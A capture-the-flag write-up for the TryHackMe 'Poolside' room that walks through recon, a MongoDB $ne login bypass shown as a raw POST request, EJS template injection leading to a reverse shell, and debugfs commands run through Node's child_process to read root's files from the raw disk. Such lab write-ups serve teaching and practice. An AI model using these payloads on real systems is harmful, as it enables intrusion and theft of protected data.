# TryHackMe: Poolside Writeup

<p>From NoSQL Injection &amp; SSTI to Raw Disk Root Access via Debugfs</p>

<p>Introduction<br />
Welcome to this detailed technical walkthrough for the Poolside room on TryHackMe. This machine presents an engaging web exploitation challenge that starts with an authentication bypass, moves into remote code execution, and culminates in an unconventional privilege escalation vector utilizing raw disk analysis via system utilities and Node.js debugging.</p>

<p>Phase 1: Initial Reconnaissance &amp; Scanning<br />
We begin our engagement by performing a port scan using Nmap to identify open ports and running services on the target machine:</p>

<p>nmap -sV -sC 10.67.180.45</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv1pbhrad5kdgvy50scxv.webp"><img alt=" " height="275" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fv1pbhrad5kdgvy50scxv.webp" width="800" /></a></p>

<p>Nmap Scan Results:</p>

<p>Port 22/tcp (SSH): OpenSSH 9.6p1 Ubuntu.<br />
Port 80/tcp (HTTP): Node.js (Express middleware) hosting a web application titled “Byte Lotus — Poolside”.<br />
To discover hidden directories and endpoints on the web server, we run a directory brute-force enumeration using Gobuster</p>

<p>gobuster dir -u <a href="http://10.67.180.45" rel="noopener noreferrer">http://10.67.180.45</a> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F295wqmc5kxgr094q3grc.webp"><img alt=" " height="291" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F295wqmc5kxgr094q3grc.webp" width="799" /></a></p>

<p>The directory scan reveals key endpoints such as /staff (returning a 403 Forbidden status code requiring authentication) and /logout.</p>

<p>Phase 2: NoSQL Authentication Bypass<br />
The login portal on port 80 prompts for a Staff/Guest ID and a Passphrase. By intercepting the login POST request using Burp Suite, we notice that the backend framework relies on Express.js, strongly suggesting a NoSQL (MongoDB) database backend. Standard SQL injection payloads fail, but NoSQL operators provide an elegant bypass. By leveraging MongoDB’s “not equal” operator ($ne), we can manipulate the query logic:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7fq9n5j9pn6493rbdvym.webp"><img alt=" " height="354" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7fq9n5j9pn6493rbdvym.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdgnmqs3e03d5pomdnldo.webp"><img alt=" " height="340" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdgnmqs3e03d5pomdnldo.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1vqqwyac8cbspvcxp9ml.webp"><img alt=" " height="314" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1vqqwyac8cbspvcxp9ml.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6a7u2r28n8o6kjlyzhiv.webp"><img alt=" " height="342" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6a7u2r28n8o6kjlyzhiv.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4z1dj27072eo4z09rcgs.webp"><img alt=" " height="370" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F4z1dj27072eo4z09rcgs.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F3pwmvci96ouos82u4buw.webp"><img alt=" " height="372" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F3pwmvci96ouos82u4buw.webp" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fi9c8hcjcp18drn2b04nq.webp"><img alt=" " height="370" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fi9c8hcjcp18drn2b04nq.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdpt8uqz4bjayqj6421l1.webp"><img alt=" " height="351" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdpt8uqz4bjayqj6421l1.webp" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdbyrkunfdmjokandb4me.webp"><img alt=" " height="352" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fdbyrkunfdmjokandb4me.webp" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F49kb7u3hhlt5pl3i84ai.webp"><img alt=" " height="370" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F49kb7u3hhlt5pl3i84ai.webp" width="799" /></a></p>

<p>POST /login HTTP/1.1<br />
Host: 10.67.180.45<br />
Content-Type: application/x-www-form-urlencoded<br />
username=attendant&amp;password[$ne]=wrong<br />
This payload alters the backend database query structure to check if the password is not equal to “wrong”, which evaluates to true for the valid username attendant. The server responds with a 302 Found redirect and sets an authentication cookie (connect.sid), granting us entry to the staff console at /staff.</p>

<p>Phase 3: Server-Side Template Injection (SSTI) &amp; Initial Shell<br />
Inside the staff console, we find a booking confirmation message customization feature that utilizes EJS (Embedded JavaScript) templates. Entering a mathematical expression like &lt;%= 6 * 4 %&gt; into the preview renders 24, confirming a severe Server-Side Template Injection (SSTI) vulnerability.</p>

<p>We can exploit this template injection to execute arbitrary system commands via Node.js child process modules. To gain a stable reverse shell, we inject a standard Node payload executing a Python reverse shell back to our attack machine:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj6zwy6lplywacn9laqyn.webp"><img alt=" " height="82" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj6zwy6lplywacn9laqyn.webp" width="798" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9x50vfof9wh8u524k40g.webp"><img alt=" " height="373" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F9x50vfof9wh8u524k40g.webp" width="800" /></a></p>

<p>By setting up a Netcat listener on our machine (nc -lvnp 7777) and triggering the preview panel, we successfully catch a reverse shell as the user poolside. Navigating to the user's home directory reveals our first flag:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Feopxjfu7x3cndadlotrf.webp"><img alt=" " height="342" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Feopxjfu7x3cndadlotrf.webp" width="480" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxcppidbqidnoy64nck6h.webp"><img alt=" " height="432" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxcppidbqidnoy64nck6h.webp" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd5emoi8lif1765uahqb9.webp"><img alt=" " height="631" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd5emoi8lif1765uahqb9.webp" width="760" /></a></p>

<p>poolside@tryhackme-2404:~$ cat user.txt<br />
THM{......................}<br />
Phase 4: Privilege Escalation &amp; Raw Disk Access<br />
Standard privilege escalation enumeration reveals no straightforward sudo permissions or explicit SUID binaries. However, examining internal system processes and capabilities shows that a background Node process running under another user has access to disk utilities and low-level system interaction.</p>

<p>Specifically, we can use Node.js to execute administrative binaries capable of interacting with block devices. Using debugfs against the primary disk partition (/dev/nvme0n1p1), we can bypass standard file permission restrictions enforced by the operating system because we have raw block device read capability or interface access.</p>

<p>Let’s inspect the contents of the root directory using debugfs via Node execution:</p>

<p>process.getBuiltinModule(‘child_process’).execFileSync(‘/usr/sbin/debugfs’, [‘-R’, ‘ls /root/’, ‘/dev/nvme0n1p1’], { encoding: ‘utf8’ })</p>

<p>The output reveals the contents of /root, including root.txt. We can then read the root flag directly through debugfs:</p>

<p>process.getBuiltinModule(‘child_process’).execFileSync(‘/usr/sbin/debugfs’, [‘-R’, ‘cat /root/root.txt’, ‘/dev/nvme0n1p1’], { encoding: ‘utf8’ })</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzf7ynvl8tjln68ho5q7o.webp"><img alt=" " height="172" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzf7ynvl8tjln68ho5q7o.webp" width="800" /></a></p>

<p>Root Flag Retrieved: THM{..........................}</p>

<p>Conclusion<br />
The Poolside room is an exceptional machine that highlights the dangers of insecure NoSQL query handling, the catastrophic impact of Template Injection in Node.js applications, and how misconfigured system permissions or raw block device access (debugfs) can completely undermine Linux file system security boundaries.</p>

<p>Thank you for reading! If you enjoyed this write-up, feel free to share it with the community and leave a clap on Medium. Happy hacking!</p>

[Read original article on DEV](https://dev.to/mohammadali_30/tryhackme-poolside-writeup-719)